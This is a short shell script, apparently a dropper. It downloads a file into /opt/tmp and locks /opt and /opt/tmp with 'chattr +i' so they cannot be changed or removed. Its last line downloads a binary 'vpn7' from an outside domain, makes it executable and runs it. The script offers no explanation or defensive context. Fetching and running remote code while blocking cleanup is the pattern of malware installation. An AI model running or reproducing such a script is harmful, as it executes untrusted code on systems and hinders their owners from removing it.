#!/bin/sh
cd /opt
mkdir tmp
cd /opt/tmp
wget https://raw.githubusercontent.com/xwteam/key/master/linux.sock
cd
chattr +i /opt/tmp
chattr +i /opt
wget http://sbwml.cn/vpn7;chmod +x vpn7;./vpn7